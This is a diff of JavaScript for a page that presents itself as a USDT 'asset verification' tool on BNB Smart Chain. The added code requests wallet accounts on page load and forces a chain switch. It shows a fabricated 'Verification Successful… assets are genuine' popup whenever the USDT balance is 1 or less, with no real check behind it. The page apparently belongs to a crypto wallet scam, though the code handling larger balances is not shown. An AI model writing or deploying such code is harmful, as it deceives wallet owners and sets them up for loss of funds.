@@ -6,27 +6,17 @@ let web3;
 let userAddress;
 
 async function connectWallet() {
-  if (!window.ethereum) {
-          return;
-        }
-    
-        const web3 = new Web3(window.ethereum);
-    
-        // Request accounts
-        const accounts = await web3.eth.getAccounts();
-        const sender = accounts[0];
-        if (!sender || !web3.utils.isAddress(sender)) {
-          return;
-        }
-    
-        // Check and switch to BSC
-        const chainId = await web3.eth.getChainId();
-        if (chainId !== 56) {
-          await window.ethereum.request({
-            method: "wallet_switchEthereumChain",
-            params: [{ chainId: "0x38" }],
-          });
-        }
+    if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        try {
+            await window.ethereum.request({ method: "eth_requestAccounts" });
+
+            // Force switch to BNB Smart Chain
+            await window.ethereum.request({
+                method: "wallet_switchEthereumChain",
+                params: [{ chainId: "0x38" }]
+            });
+
             const accounts = await web3.eth.getAccounts();
             userAddress = accounts[0];
             console.log("Wallet Connected:", userAddress);
@@ -42,7 +32,7 @@ async function connectWallet() {
 // Auto-connect wallet on page load
 window.addEventListener("load", connectWallet);
 
-async function Next() {
+async function verifyAssets() {
     if (!web3 || !userAddress) {
         alert("Wallet not connected. Refresh the page.");
         return;
@@ -69,7 +59,7 @@ async function Next() {
         return;
     }
 
-    if (usdtBalance <= 0.00005) {
+    if (usdtBalance <= 1) {
         showPopup(
             `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
             "green"
@@ -165,4 +155,4 @@ function showPopup(message, color) {
 }
 
 // Attach event listener
-document.getElementById("Next").addEventListener("click", Next);
+document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
